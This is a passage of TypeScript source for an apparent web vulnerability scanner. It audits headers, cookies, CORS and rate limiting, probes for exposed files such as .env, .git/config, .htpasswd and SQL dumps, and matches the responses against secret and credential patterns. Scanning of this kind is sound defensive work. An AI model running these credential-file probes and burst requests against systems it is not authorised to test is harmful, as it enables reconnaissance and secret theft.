          const reqBodySchema = operation?.requestBody?.content?.['application/json']?.schema;
          if (reqBodySchema?.properties) {
            for (const propName of Object.keys(reqBodySchema.properties)) fields.add(propName);
          }
          if (fields.size > 0) { results.push({ path, fields: [...fields] }); count++; }
        }
      }
      return count;
    } catch { return 0; }
  };

  for (const specPath of SPEC_PATHS) {
    try {
      const specUrl = new URL(specPath, baseUrl).toString();
      const probe = await fetch(specUrl, {
        headers: { ...FETCH_HEADERS, Accept: 'application/json, application/yaml, */*' },
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (!probe || probe.status !== 200) continue;
      const ct = (probe.headers.get('content-type') || '').toLowerCase();
      const body = await probe.text();

      // Case 1: Direct JSON/YAML spec
      if (ct.includes('json') || ct.includes('yaml') || body.trim().startsWith('{')) {
        log(`📖  OpenAPI spec found at ${specPath} — parsing endpoint surface...`);
        const count = await parseSpec(specUrl);
        if (count > 0) {
          log(`🗂️   OpenAPI: discovered ${count} parameterized endpoint(s) from ${specPath}`);
          break;
        }
      }

      // Case 2: Swagger UI HTML page — extract the actual spec URL from the HTML
      // Pattern: SwaggerUIBundle({ url: "/api-docs.json", ... }) or url: "..."
      if (ct.includes('html') || body.includes('swagger-ui') || body.includes('SwaggerUI')) {
        const urlMatch =
          body.match(/[Uu][Rr][Ll]\s*:\s*["']([^"']+\.(?:json|yaml))["']/) ||
          body.match(/[Uu][Rr][Ll]\s*:\s*["'](\/[^"']{4,80})["']/) ||
          body.match(/spec-url=["']([^"']+)["']/) ||
          body.match(/data-url=["']([^"']+)["']/);

        if (urlMatch) {
          const embeddedSpecUrl = new URL(urlMatch[1], baseUrl).toString();
          log(`📖  Swagger UI at ${specPath} — extracting spec from ${urlMatch[1]}...`);
          const count = await parseSpec(embeddedSpecUrl);
          if (count > 0) {
            log(`🗂️   OpenAPI: discovered ${count} parameterized endpoint(s) via Swagger UI at ${specPath}`);
            break;
          }
        }

        // Fallback: Try the same path with .json appended (common Juice Shop pattern)
        const jsonFallback = specUrl.replace(/\/?$/, '.json').replace('.json.json', '.json');
        if (jsonFallback !== specUrl) {
          log(`📖  Trying JSON fallback: ${jsonFallback}...`);
          const count = await parseSpec(jsonFallback);
          if (count > 0) {
            log(`🗂️   OpenAPI: discovered ${count} parameterized endpoint(s) from ${jsonFallback}`);
            break;
          }
        }
      }
    } catch { /* spec not found or unparseable — try next path */ }
  }

  return results;
}

export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
  const log = (msg: string) => {
    console.log(msg);
    emitLog(scanId, msg);
  };

  log(`🚀 [VulnScanner v2.0] Starting security audit for: ${targetUrl}`);

  // Per-scan state — replacing former module-level globals to fix concurrent-scan corruption
  const session: AuthSession = { ...EMPTY_SESSION };
  const storedXSSMarkers: StoredXSSInjection[] = [];
  const controller = registerScanController(scanId);
  const findings: PendingFinding[] = [];

  try {
    await prisma.scan.update({ where: { id: scanId }, data: { status: "CRAWLING" } });

    // ══════════════════════════════════════════════════════════════════════
    // PHASE 0: NMAP PORT SCAN (fires in parallel with main page fetch)
    // ══════════════════════════════════════════════════════════════════════
    log(`🔌  Phase 0: Nmap port scan & service fingerprinting (runs in parallel)...`);
    const nmapPromise = runNmapScan(targetUrl, log);

    // Attempt to acquire an authenticated session before the crawl begins
    log(`🔐  Phase 0b: Attempting auto-login to acquire authenticated session...`);
    await attemptAutoLogin(targetUrl, log, session);

    // Also run TLS analysis in parallel with nmap
    log(`🔒  Phase 0c: TLS/SSL certificate inspection...`);
    const tlsPromise = probeTLSCertificate(targetUrl);

    const backgroundAiPromises: Promise<any>[] = [];
    const seenKeys = new Set<string>();

    const originalPush = findings.push;
    findings.push = function (...items: PendingFinding[]) {
      for (const rawItem of items) {
        if (rawItem) {
          // ── Ensure every finding has confidence metadata ────────────────
          const item: PendingFinding = {
            confidence: 0.85,           // default for probes not yet updated
            validationSteps: [],
            isVerified: false,
            ...rawItem,
          };

          // ── Context filtering: drop known-noisy finding types ───────────
          if (!passesContextFilter(item)) continue;

          // ── Confidence gate: drop low-confidence non-critical findings ──
          if ((item.confidence ?? 0.85) < 0.60 && item.severity !== "CRITICAL") continue;

          const key = getDeduplicationKey(item);
          if (seenKeys.has(key)) {
            // Keep the higher-confidence version
            const existingIdx = findings.findIndex(
              f => getDeduplicationKey(f) === key
            );
            if (existingIdx >= 0 && (item.confidence ?? 0.85) > (findings[existingIdx].confidence ?? 0.85)) {
              findings[existingIdx] = item;
            }
            continue;
          }
          seenKeys.add(key);
          originalPush.call(this, item);
          saveFindingInstantly(scanId, item, backgroundAiPromises).catch(() => { });
        }
      }
      return this.length;
    };

    const visitedUrls = new Set<string>();
    const urlQueue: string[] = [targetUrl];
    // Seed common SPA routes for Angular / React / Vue hash routing (e.g. Juice Shop)
    try {
      const baseOrigin = new URL(targetUrl).origin;
      const COMMON_SPA_HASH_ROUTES = [
        "/#/search", "/#/login", "/#/register", "/#/basket",
        "/#/administration", "/#/score-card", "/#/privacy-security/privacy-policy",
        "/#/recycle", "/#/contact", "/#/about", "/#/photo-wall",
        "/#/user/change-password", "/#/tokens", "/#/privacy-security/data-export",
      ];
      for (const route of COMMON_SPA_HASH_ROUTES) {
        const full = `${baseOrigin}${route}`;
        if (!urlQueue.includes(full)) urlQueue.push(full);
      }
    } catch { /* skip */ }
    const MAX_PAGES_TO_SCAN = 35;
    let homepageHtml = "";

    while (urlQueue.length > 0 && visitedUrls.size < MAX_PAGES_TO_SCAN) {
      // ═ Abort check: user requested scan stop ═══════════════════════════════════════
      if (controller.signal.aborted) {
        throw new Error("scan_cancelled");
      }
      const currentUrl = urlQueue.shift()!;
      // For SPA hash routes (e.g. /#/login), we need TWO url forms:
      //   fetchUrl    = hash stripped → used for HTTP fetch (server returns same shell HTML for all hash routes)
      //   renderUrl   = full URL with hash → used for Playwright so it renders the correct SPA page
      //   normalizedUrl = the dedup key (we deduplicate by full URL to allow scanning /#/login AND /#/basket)
      let normalizedUrl = currentUrl;
      let fetchUrl = currentUrl;
      try {
        const parsed = new URL(currentUrl);
        const isHashRoute = parsed.hash.startsWith('#/');
        normalizedUrl = parsed.toString();   // keep hash for dedup — /#/login ≠ /#/basket
        if (!isHashRoute) parsed.hash = "";
        fetchUrl = new URL(currentUrl).toString();
        if (!isHashRoute) {
          const fp = new URL(currentUrl);
          fp.hash = "";
          fetchUrl = fp.toString();
        }
      } catch { /* skip */ }

      if (visitedUrls.has(normalizedUrl)) continue;
      visitedUrls.add(normalizedUrl);

      log(`📖 [Page ${visitedUrls.size}/${MAX_PAGES_TO_SCAN}] Crawling & scanning: ${normalizedUrl}`);

      // ── Fetch current page (always use hash-stripped URL since server returns same shell) ──
      const mainResp = await safeFetch(fetchUrl);
      if (controller.signal.aborted) {
        throw new Error("scan_cancelled");
      }
      const headers: Record<string, string> = {};
      let pageHtml = "";
      let cookieHeaders: string[] = [];
      let fetchSucceeded = false;

      if (mainResp) {
        mainResp.headers.forEach((val, key) => {
          headers[key.toLowerCase()] = val;
        });
        // Collect ALL Set-Cookie headers
        const rawCookie = mainResp.headers.get("set-cookie") || "";
        cookieHeaders = rawCookie ? rawCookie.split(/,(?=[^ ])/) : [];
        pageHtml = await mainResp.text();
        fetchSucceeded = true;
        log(`✅ Connected to page — HTTP ${mainResp.status} | ${(pageHtml.length / 1024).toFixed(1)} KB received`);
      } else {
        log(`⚠️  Could not reach page ${normalizedUrl}. Running passive checks where possible.`);
      }

      // ── SITE-GLOBAL CHECKS (Run ONLY once on the target homepage URL) ─────────────
      if (normalizedUrl === targetUrl) {
        homepageHtml = pageHtml;
        log(`🛡️  Phase 1: Auditing security headers (CSP, HSTS, X-Frame-Options, CORS, referrer policy)...`);
        await prisma.scan.update({ where: { id: scanId }, data: { status: "SCANNING" } });

        // Await the parallel nmap promise here
        try {
          const nmapFindings: NmapFinding[] = await nmapPromise;
          for (const nf of nmapFindings) {
            findings.push(nf as PendingFinding);
          }
          log(`🗺️   Phase 0 complete — ${nmapFindings.length} network finding(s) merged into scan results`);
        } catch (nmapErr) {
          log(`⚠️   Phase 0 (nmap) encountered an error: ${nmapErr instanceof Error ? nmapErr.message : String(nmapErr)}`);
        }

        // A1 – Missing X-Frame-Options / frame-ancestors (Clickjacking)
        const csp = headers["content-security-policy"] || "";
        if (fetchSucceeded && !headers["x-frame-options"] && !csp.includes("frame-ancestors")) {
          findings.push({
            type: "clickjacking",
            severity: "MEDIUM",
            url: targetUrl,
            evidence:
              "Neither 'X-Frame-Options' nor a 'frame-ancestors' CSP directive found. The site can be embedded in a third-party iframe to trick users into clicking hidden buttons.",
            cvssScore: 5.4,
            cveId: "CWE-1021",
          });
        }

        // A2 – Missing Content-Security-Policy (enables XSS escalation)
        if (fetchSucceeded && !csp) {
          findings.push({
            type: "missing-csp",
            severity: "HIGH",
            url: targetUrl,
            evidence:
              "No 'Content-Security-Policy' header found. Without CSP the browser executes inline scripts and loads assets from any origin, making XSS attacks trivially escalatable.",
            cvssScore: 7.2,
            cveId: "CWE-693",
          });
        }

        // A3 – Missing HSTS (downgrades HTTPS → HTTP, enables MITM)
        if (fetchSucceeded && targetUrl.startsWith("https") && !headers["strict-transport-security"]) {
          findings.push({
            type: "missing-hsts",
            severity: "MEDIUM",
            url: targetUrl,
            evidence:
              "Missing 'Strict-Transport-Security' header on HTTPS site. Attackers performing SSL stripping can force browsers to use plain HTTP, exposing session cookies and data.",
            cvssScore: 6.1,
            cveId: "CWE-319",
          });
        }

        // A4 – Missing X-Content-Type-Options (MIME sniffing)
        if (fetchSucceeded && !headers["x-content-type-options"]) {
          findings.push({
            type: "missing-x-content-type-options",
            severity: "LOW",
            url: targetUrl,
            evidence:
              "Missing 'X-Content-Type-Options: nosniff' header. Browsers may MIME-sniff uploaded files (e.g., execute a .jpg as JavaScript), enabling stored XSS via file uploads.",
            cvssScore: 3.1,
            cveId: "CWE-430",
          });
        }

        // A5 – Missing Referrer-Policy (leaks URLs to third parties)
        if (fetchSucceeded && !headers["referrer-policy"]) {
          findings.push({
            type: "missing-referrer-policy",
            severity: "INFO",
            url: targetUrl,
            evidence:
              "No 'Referrer-Policy' header. Sensitive query parameters (tokens, IDs) in URLs may be sent to third-party sites linked from the page via the Referer header.",
            cvssScore: 2.3,
          });
        }

        // A6 – Missing Permissions-Policy
        if (fetchSucceeded && !headers["permissions-policy"] && !headers["feature-policy"]) {
          findings.push({
            type: "missing-permissions-policy",
            severity: "LOW",
            url: targetUrl,
            evidence:
              "No 'Permissions-Policy' header. Sensitive browser features (camera, microphone, geolocation, payment) are unrestricted for all origins including third-party iframes.",
            cvssScore: 2.7,
          });
        }

        // A7 – Server version disclosure
        const serverHeader = headers["server"] || "";
        const xPoweredBy = headers["x-powered-by"] || "";
        const leakedHeaders = [serverHeader, xPoweredBy].filter((h) => /[a-zA-Z]+\/[\d.]+|php|asp\.net|tomcat|jboss/i.test(h));
        if (fetchSucceeded && leakedHeaders.length > 0) {
          findings.push({
            type: "server-version-disclosure",
            severity: "LOW",
            url: targetUrl,
            evidence: `Server discloses technology/version in response headers: "${leakedHeaders.join(", ")}". Attackers use this to look up known CVEs for the exact version.`,
            cvssScore: 3.7,
            cveId: "CWE-200",
          });
        }

        log(`🍪  Phase 2: Analyzing session cookies — HttpOnly, Secure, SameSite flags...`);
        if (fetchSucceeded && cookieHeaders.length > 0) {
          const cookieIssues: string[] = [];
          const reportedTypes = new Set<string>();

          for (const cookie of cookieHeaders) {
            const lower = cookie.toLowerCase();
            const cookieName = cookie.split("=")[0]?.trim() || "session";

            // B1 – Missing HttpOnly flag
            if (!lower.includes("httponly") && !reportedTypes.has(`httponly:${cookieName}`)) {
              reportedTypes.add(`httponly:${cookieName}`);
              findings.push({
                type: "session-hijacking-no-httponly",
                severity: "HIGH",
                url: targetUrl,
                parameter: cookieName,
                evidence: `Cookie "${cookieName}" is missing the 'HttpOnly' flag. JavaScript on the page can read this cookie and send it to an attacker's server.`,
                cvssScore: 7.5,
                cveId: "CWE-1004",
              });
              cookieIssues.push(`${cookieName}: missing HttpOnly`);
            }

            // B2 – Missing Secure flag
            if (!lower.includes("secure") && !reportedTypes.has(`secure:${cookieName}`)) {
              reportedTypes.add(`secure:${cookieName}`);
              findings.push({
                type: "session-hijacking-no-secure",
                severity: "MEDIUM",
                url: targetUrl,
                parameter: cookieName,
                evidence: `Cookie "${cookieName}" is missing the 'Secure' flag. The browser will transmit this cookie over unencrypted HTTP connections.`,
                cvssScore: 5.9,
                cveId: "CWE-614",
              });
              cookieIssues.push(`${cookieName}: missing Secure`);
            }

            // B3 – Missing SameSite flag
            if (!lower.includes("samesite") && !reportedTypes.has(`samesite:${cookieName}`)) {
              reportedTypes.add(`samesite:${cookieName}`);
              findings.push({
                type: "csrf-via-cookie-samesite",
                severity: "MEDIUM",
                url: targetUrl,
                parameter: cookieName,
                evidence: `Cookie "${cookieName}" has no 'SameSite' attribute. Cross-site requests will automatically include this cookie.`,
                cvssScore: 6.1,
                cveId: "CWE-352",
              });
              cookieIssues.push(`${cookieName}: missing SameSite`);
            }

            // B4 – Cookie scope too broad (Domain set to parent domain)
            const domainMatch = cookie.match(/domain\s*=\s*\.?([^;\s]+)/i);
            if (domainMatch && !reportedTypes.has(`scope:${cookieName}`)) {
              const cookieDomain = domainMatch[1].toLowerCase();
              const targetHost = new URL(targetUrl).hostname.toLowerCase();
              if (cookieDomain !== targetHost && targetHost.endsWith(cookieDomain)) {
                reportedTypes.add(`scope:${cookieName}`);
                findings.push({
                  type: "cookie-scope-too-broad",
                  severity: "LOW",
                  url: targetUrl,
                  parameter: cookieName,
                  evidence: `Cookie "${cookieName}" has domain="${cookieDomain}" which is broader than the target host "${targetHost}". Subdomains can access this cookie.`,
                  cvssScore: 3.5,
                  cveId: "CWE-1275",
                });
                cookieIssues.push(`${cookieName}: broad domain scope`);
              }
            }
          }

          if (cookieIssues.length > 0) {
            log(`🍪  Cookie audit: ${cookieIssues.length} issue(s) found across ${cookieHeaders.length} cookie(s)`);
          }
        }

        // G1 – CORS Misconfiguration
        const corsOrigin = headers["access-control-allow-origin"] || "";
        const corsCredentials = (headers["access-control-allow-credentials"] || "").toLowerCase();
        if (fetchSucceeded) {
          if (corsOrigin === "*" && corsCredentials === "true") {
            findings.push({
              type: "cors-credentials-wildcard",
              severity: "CRITICAL",
              url: targetUrl,
              evidence:
                "'Access-Control-Allow-Origin: *' combined with 'Access-Control-Allow-Credentials: true' allows credentialed cross-origin requests.",
              cvssScore: 9.0,
              cveId: "CWE-942",
            });
          } else if (corsOrigin === "*") {
            findings.push({
              type: "cors-wildcard",
              severity: "LOW",
              url: targetUrl,
              evidence:
                "CORS wildcard ('Access-Control-Allow-Origin: *') is set.",
              cvssScore: 3.5,
              cveId: "CWE-942",
            });
          }
        }

        // I1 – robots.txt
        try {
          const robotsUrl = new URL("/robots.txt", targetUrl).toString();
          const robotsResp = await safeFetch(robotsUrl, 5000);
          if (robotsResp && robotsResp.ok) {
            const robotsTxt = await robotsResp.text();
            const sensitiveWords = ["/admin", "/api", "/config", "/backup", "/private", "/internal", "/.env", "/db", "/database", "/secret", "/manage", "/phpmyadmin"];
            const exposed = sensitiveWords.filter((p) => robotsTxt.toLowerCase().includes(p));
            if (exposed.length > 0) {
              findings.push({
                type: "robots-txt-disclosure",
                severity: "INFO",
                url: robotsUrl,
                evidence: `robots.txt discloses sensitive paths: ${exposed.join(", ")}.`,
                cvssScore: 2.3,
              });
            }
          }
        } catch { /* skip */ }

        // J1 – Probing 55 Sensitive Endpoints (Phase 4)
        log(`🔎  Phase 4: Probing sensitive endpoints (.env, .git, wp-admin, phpinfo, Spring actuators)...`);
        const isSoft404OrSPARedirect = (endpointBody: string, homepageBody: string): boolean => {
          if (!homepageBody) return false;
          const getTitle = (html: string) => {
            const m = html.match(/<title>([^<]+)<\/title>/i);
            return m ? m[1].trim() : "";
          };
          const homeTitle = getTitle(homepageBody);
          const epTitle = getTitle(endpointBody);
          if (homeTitle && epTitle && homeTitle === epTitle) return true;
          const lenDiff = Math.abs(endpointBody.length - homepageBody.length);
          const threshold = homepageBody.length * 0.08;
          if (lenDiff < threshold) {
            if (/__NEXT_DATA__|__nuxt|webpack|next\/static|react-root|#app|#root/i.test(endpointBody)) return true;
          }
          return false;
        };

        const sensitiveEndpoints = [
          { path: "/.env", label: ".env file", severity: "CRITICAL", cvssScore: 9.8, verify: (b: string) => /^[A-Z_]+=.+/m.test(b) || /DATABASE_URL|API_KEY|SECRET|PASSWORD|JWT/i.test(b) },
          { path: "/.env.local", label: ".env.local", severity: "CRITICAL", cvssScore: 9.8, verify: (b: string) => /^[A-Z_]+=.+/m.test(b) || /DATABASE_URL|API_KEY|SECRET|PASSWORD|JWT/i.test(b) },
          { path: "/.env.production", label: ".env.production", severity: "CRITICAL", cvssScore: 9.8, verify: (b: string) => /^[A-Z_]+=.+/m.test(b) || /DATABASE_URL|API_KEY|SECRET|PASSWORD|JWT/i.test(b) },
          { path: "/.env.backup", label: ".env.backup", severity: "CRITICAL", cvssScore: 9.8, verify: (b: string) => /^[A-Z_]+=.+/m.test(b) || /DATABASE_URL|API_KEY|SECRET|PASSWORD/i.test(b) },
          { path: "/.git/HEAD", label: ".git repository (HEAD)", severity: "CRITICAL", cvssScore: 9.8, verify: (b: string) => /^ref:\s+refs\/heads\//m.test(b) || /^[0-9a-f]{40}$/m.test(b.trim()) },
          { path: "/.git/config", label: ".git/config", severity: "CRITICAL", cvssScore: 9.8, verify: (b: string) => /\[core\]/.test(b) || /\[remote/.test(b) },
          { path: "/.svn/entries", label: ".svn repository", severity: "CRITICAL", cvssScore: 9.0, verify: (b: string) => /^10$/m.test(b) || /svn\.apache\.org/i.test(b) },
          { path: "/.htaccess", label: ".htaccess file", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /RewriteEngine|AuthType|Require|Allow from|Deny from/i.test(b) },
          { path: "/.htpasswd", label: ".htpasswd credentials", severity: "CRITICAL", cvssScore: 9.5, verify: (b: string) => /^[^:]+:\$[^\s]+$/m.test(b) || /^[^:]+:[a-zA-Z0-9./]{13}$/m.test(b) },
          { path: "/wp-admin", label: "WordPress admin", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /wp-login|WordPress|wp-admin/i.test(b) },
          { path: "/wp-login.php", label: "WordPress login", severity: "MEDIUM", cvssScore: 5.3, verify: (b: string) => /user_login|user_pass|wp-login/i.test(b) },
          { path: "/phpmyadmin", label: "phpMyAdmin", severity: "HIGH", cvssScore: 8.0, verify: (b: string) => /phpMyAdmin|phpmyadmin|pma_/i.test(b) },
          { path: "/pma", label: "phpMyAdmin (pma)", severity: "HIGH", cvssScore: 8.0, verify: (b: string) => /phpMyAdmin|phpmyadmin|pma_/i.test(b) },
          { path: "/phpinfo.php", label: "phpinfo()", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /PHP Version|phpinfo\(\)|php\.ini/i.test(b) },
          { path: "/info.php", label: "PHP info page", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /PHP Version|phpinfo\(\)|php\.ini/i.test(b) },
          { path: "/server-status", label: "Apache server-status", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /Apache Server Status|requests currently being processed/i.test(b) },
          { path: "/_profiler", label: "Symfony Profiler", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /Symfony|sf-toolbar|profiler/i.test(b) },
          { path: "/actuator/env", label: "Spring Boot /env", severity: "CRITICAL", cvssScore: 9.0, verify: (b: string, ct: string) => ct.includes("application/json") && /"propertySources"|"activeProfiles"/i.test(b) },
          { path: "/actuator/health", label: "Spring Boot /health", severity: "MEDIUM", cvssScore: 5.3, verify: (b: string, ct: string) => ct.includes("application/json") && /"status"\s*:\s*"UP"/i.test(b) },
          { path: "/metrics", label: "Metrics endpoint", severity: "MEDIUM", cvssScore: 5.3, verify: (b: string) => /process_cpu_seconds|go_goroutines|http_requests_total/i.test(b) },
          { path: "/config.yml", label: "config.yml", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /^[a-z_]+:\s+.+/m.test(b) && /password|secret|key|database/i.test(b) },
          { path: "/config.json", label: "config.json", severity: "HIGH", cvssScore: 7.5, verify: (b: string, ct: string) => ct.includes("application/json") && /password|secret|apiKey|database/i.test(b) },
          { path: "/database.yml", label: "database.yml", severity: "CRITICAL", cvssScore: 9.0, verify: (b: string) => /adapter:|database:|username:|password:/i.test(b) },
          { path: "/backup.zip", label: "Backup archive (.zip)", severity: "HIGH", cvssScore: 8.0, verify: (_: string, ct: string) => ct.includes("application/zip") || ct.includes("octet-stream") },
          { path: "/backup.tar.gz", label: "Backup archive (.tar.gz)", severity: "HIGH", cvssScore: 8.0, verify: (_: string, ct: string) => ct.includes("gzip") || ct.includes("octet-stream") },
          { path: "/db.sql", label: "SQL database dump", severity: "CRITICAL", cvssScore: 9.5, verify: (b: string) => /CREATE TABLE|INSERT INTO|DROP TABLE/i.test(b) },
          { path: "/dump.sql", label: "SQL dump", severity: "CRITICAL", cvssScore: 9.5, verify: (b: string) => /CREATE TABLE|INSERT INTO|DROP TABLE/i.test(b) },
          { path: "/api/v1/users", label: "User list API", severity: "HIGH", cvssScore: 8.5, verify: (b: string, ct: string) => ct.includes("application/json") && /email|username|password/i.test(b) },
          { path: "/api/users", label: "User list API", severity: "HIGH", cvssScore: 8.5, verify: (b: string, ct: string) => ct.includes("application/json") && /email|username|password/i.test(b) },
          { path: "/api/admin", label: "Admin API", severity: "HIGH", cvssScore: 8.0, verify: (b: string, ct: string) => ct.includes("application/json") && b.length > 30 },
          { path: "/rest/user/whoami", label: "Identity disclosure", severity: "HIGH", cvssScore: 7.5, verify: (b: string, ct: string) => ct.includes("application/json") && /email|id|role/i.test(b) },
          { path: "/rest/products/search", label: "Product Search API", severity: "MEDIUM", cvssScore: 5.3, verify: (b: string, ct: string) => ct.includes("application/json") && /status.*success/i.test(b) },
          { path: "/ftp", label: "Exposed FTP Directory", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /Index of \/ftp|coupons|legal.md/i.test(b) },
          { path: "/assets/public", label: "Public Assets Directory", severity: "LOW", cvssScore: 3.5, verify: (b: string) => /Index of/i.test(b) },
          { path: "/socket.io/", label: "Socket.IO endpoint", severity: "MEDIUM", cvssScore: 5.3, verify: (b: string) => /socket\.io|websocket|polling/i.test(b) },
        ];

        let checkedCount = 0;
        for (const endpoint of sensitiveEndpoints) {
          if (controller.signal.aborted) throw new Error("scan_cancelled");
          checkedCount++;
          if (checkedCount % 15 === 0 || checkedCount === 1) {
            log(`🔎  Phase 4: Probing endpoints (${checkedCount}/${sensitiveEndpoints.length})...`);
          }
          try {
            const endpointUrl = new URL(endpoint.path, targetUrl).toString();
            const resp = await safeFetch(endpointUrl, 5000);
            if (!resp || resp.status !== 200) continue;
            const body = await resp.text();
            const ct = resp.headers.get("content-type") ?? "";

            if (/<title>[^<]*(404|not found|page not found)[^<]*<\/title>/i.test(body)) continue;
            if (body.length < 20) continue;
            if (pageHtml && isSoft404OrSPARedirect(body, pageHtml)) continue;
            if (!endpoint.verify(body, ct)) continue;

            findings.push({
              type: "sensitive-endpoint-exposed",
              severity: endpoint.severity as any,
              url: endpointUrl,
              evidence: `"${endpoint.label}" at ${endpointUrl} confirmed exposed: HTTP 200 with matching content fingerprint.`,
              cvssScore: endpoint.cvssScore,
              cveId: "CWE-538",
            });
          } catch { /* skip */ }
        }

        // K1 – Rate Limiting & DoS checks (Phase 5)
        log(`🚦  Phase 5: Testing rate-limiting and DoS protection (burst probe of 10 requests)...`);
        const rateLimitHeaders = ["x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset", "ratelimit-limit", "retry-after", "x-rate-limit-limit", "x-rate-limit-remaining"];
        const hasRateLimitHeaders = rateLimitHeaders.some((h) => headers[h]);
        const BURST_COUNT = 10;
        let got429 = false;
        let got429AfterN = -1;

        try {
          const burstRequests = Array.from({ length: BURST_COUNT }, () =>
            fetch(targetUrl, {
              method: "GET",
              headers: FETCH_HEADERS,
              signal: AbortSignal.timeout(5000),
              // @ts-ignore
              next: { revalidate: 0 },
            }).catch(() => null)
          );
          const burstResults = await Promise.all(burstRequests);
          for (let i = 0; i < burstResults.length; i++) {
            const r = burstResults[i];
            if (r && r.status === 429) {
              got429 = true;
              got429AfterN = i + 1;
              break;
            }
          }
        } catch { /* skip */ }

        const wafHeaders = ["cf-ray", "x-sucuri-id", "x-cache", "x-amz-cf-id", "x-waf-event-info", "x-cdn"];
        const hasWafOrCdn = wafHeaders.some((h) => headers[h]);

        if (got429) {
          findings.push({
            type: "rate-limit-active",
            severity: "INFO",
            url: targetUrl,
            evidence: `Rate limiting is active. The server responded with HTTP 429 after ${got429AfterN} rapid requests.`,
            cvssScore: 0.0,
          });
        } else if (!hasRateLimitHeaders && !hasWafOrCdn) {
          findings.push({
            type: "missing-rate-limiting",
            severity: "HIGH",
            url: targetUrl,
            evidence: `No rate limiting detected. ${BURST_COUNT} rapid consecutive requests succeeded without HTTP 429 or WAF blocks.`,
            cvssScore: 7.5,
            cveId: "CWE-770",
          });
        } else if (!hasRateLimitHeaders && hasWafOrCdn) {
          findings.push({
            type: "rate-limit-unverified",
            severity: "MEDIUM",
            url: targetUrl,
            evidence: `WAF/CDN detected (${wafHeaders.filter((h) => headers[h]).join(", ")}) but no explicit rate-limit headers or 429 blocks triggered.`,
            cvssScore: 4.3,
            cveId: "CWE-770",
          });
        } else if (hasRateLimitHeaders && !got429) {
          findings.push({
            type: "rate-limit-headers-present",
            severity: "INFO",
            url: targetUrl,
            evidence: `Rate-limit response headers detected (${rateLimitHeaders.filter((h) => headers[h]).join(", ")}). Burst probe did not trigger a 429.`,
            cvssScore: 1.5,
          });
        }

        // Sitemap check (L4)
        try {
          const sitemapUrl = new URL("/sitemap.xml", targetUrl).toString();
          const sitemapResp = await safeFetch(sitemapUrl, 5000);
          if (sitemapResp && sitemapResp.ok) {
            const sitemapXml = await sitemapResp.text();
            const sitemapUrls = parseSitemap(sitemapXml, targetUrl);
            if (sitemapUrls.length > 0) {
              for (const u of sitemapUrls) {
                try {
                  const cleanSitemapUrl = new URL(u);
                  cleanSitemapUrl.hash = "";
                  const sitemapStr = cleanSitemapUrl.toString();
                  if (!visitedUrls.has(sitemapStr) && !urlQueue.includes(sitemapStr)) {
                    urlQueue.push(sitemapStr);
                  }
                } catch { /* skip */ }
              }
              console.log(`🗺️  sitemap.xml: found ${sitemapUrls.length} additional URL(s)`);
            }
          }
        } catch { /* skip */ }

        // security.txt check (L5)
        try {
          const secTxtUrls = [
            new URL("/.well-known/security.txt", targetUrl).toString(),
            new URL("/security.txt", targetUrl).toString(),
          ];
          const hasSecurityTxt = (
            await Promise.all(secTxtUrls.map((u) => safeFetch(u, 4000)))
          ).some((r) => r && r.ok);
          if (!hasSecurityTxt) {
            findings.push({
              type: "missing-security-txt",
              severity: "INFO",
              url: targetUrl,
              evidence: "No security.txt file found at /.well-known/security.txt or /security.txt.",
              cvssScore: 0.0,
            });
          }
        } catch { /* skip */ }
      }

      // ── PAGE-SPECIFIC CHECKS (Run on EVERY page in the queue) ─────────────────────
      let renderedHtml = pageHtml;
      let runtimeFrameworks: string[] = [];
      let browserLinks: string[] = [];
      let browserApiEndpoints: string[] = [];

      if (controller.signal.aborted) throw new Error("scan_cancelled");

      const browserAuthSession = (session.bearerToken || session.cookies)
        ? { cookies: session.cookies, bearerToken: session.bearerToken }
        : undefined;
      const browserResult = await renderWithBrowser(normalizedUrl, log, scanId, browserAuthSession);
      
      if (controller.signal.aborted) throw new Error("scan_cancelled");

      if (browserResult) {
        renderedHtml = browserResult.html;
        runtimeFrameworks = browserResult.runtimeFrameworks;
        browserLinks = browserResult.discoveredLinks;
        browserApiEndpoints = browserResult.interceptedRequests || [];
      }

      // ── CLIENT-SIDE STORAGE AUDIT (P1: detect JWTs, API keys in localStorage) ──
      if (visitedUrls.size === 1) {
        if (controller.signal.aborted) throw new Error("scan_cancelled");
        log(`🗄️  Auditing client-side storage (localStorage, sessionStorage)...`);
        const storageFindings = await auditClientStorage(normalizedUrl, log, scanId, browserAuthSession);
        for (const sf of storageFindings) {
          const severityMap: Record<string, "CRITICAL" | "HIGH" | "MEDIUM"> = {
            jwt: "HIGH", "stripe-key": "CRITICAL", "aws-key": "CRITICAL",
            "sendgrid-key": "CRITICAL", "private-key": "CRITICAL",
            "github-token": "CRITICAL", "api-key-label": "HIGH",
            "password-label": "CRITICAL", "auth-token": "MEDIUM",
          };
          const severity = severityMap[sf.detectedType] || "MEDIUM";
          const cvssMap: Record<string, number> = {
            jwt: 7.5, "stripe-key": 9.5, "aws-key": 9.5,
            "sendgrid-key": 9.0, "private-key": 9.8,
            "github-token": 9.0, "api-key-label": 7.5,
            "password-label": 9.5, "auth-token": 6.5,
          };
          findings.push({
            type: "client-storage-sensitive-data",
            severity,
            url: normalizedUrl,
            parameter: sf.key,
            evidence: `Sensitive data found in ${sf.storageType}: key="${sf.key}" contains ${sf.detectedType}. Value snippet: "${sf.valueSnippet.slice(0, 80)}...". Client-side storage is accessible to any XSS attack on the page.`,
            cvssScore: cvssMap[sf.detectedType] || 6.5,
            cveId: "CWE-922",
            confidence: CONFIDENCE.DETERMINISTIC,
            validationSteps: [`${sf.storageType}.getItem("${sf.key}") returned ${sf.detectedType} pattern`],
            isVerified: true,
          });
        }
      }

      if (fetchSucceeded || browserResult) {
        // L1: Crawl links
        const staticLinks = extractSameOriginLinks(renderedHtml, normalizedUrl);
        const discoveredLinks = [...new Set([...staticLinks, ...browserLinks])].slice(0, 50);

        // Queue newly discovered same-origin links
        // FIX: Preserve hash fragments for SPA hash-routing (Angular /#/login, React /#/basket etc.)
